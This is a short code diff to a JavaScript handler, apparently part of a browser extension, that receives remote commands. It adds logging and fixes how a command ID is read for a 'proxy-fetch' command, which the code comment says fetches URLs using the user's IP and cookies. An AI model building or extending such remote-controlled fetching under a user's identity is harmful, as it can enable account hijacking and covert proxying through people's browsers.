@@ -858,6 +858,11 @@ async function handleRemoteCommand(data) {
         break;
       
       case 'proxy-fetch':
+        log('info', '🌐 Proxy-fetch command received:', {
+          command_id: data.command_id,
+          has_payload: !!data.payload,
+          payload_keys: data.payload ? Object.keys(data.payload) : []
+        });
         await handleProxyFetchCommand(data);
         break;
       
@@ -904,9 +909,10 @@ async function updateCommandStatus(command_id, status, error_message) {
 
 // Handle proxy-fetch command (fetch URL using user's IP and cookies)
 async function handleProxyFetchCommand(data) {
-  const { target_url, cookies: providedCookies, command_id } = data.payload;
+  const command_id = data.command_id; // ✅ Read from root level
+  const { target_url, cookies: providedCookies } = data.payload;
   
-  log('info', `🌐 Proxy-fetch request for: ${target_url}`);
+  log('info', `🌐 Proxy-fetch request for: ${target_url}`, { command_id });
   
   try {
     // 1. Set cookies in the browser
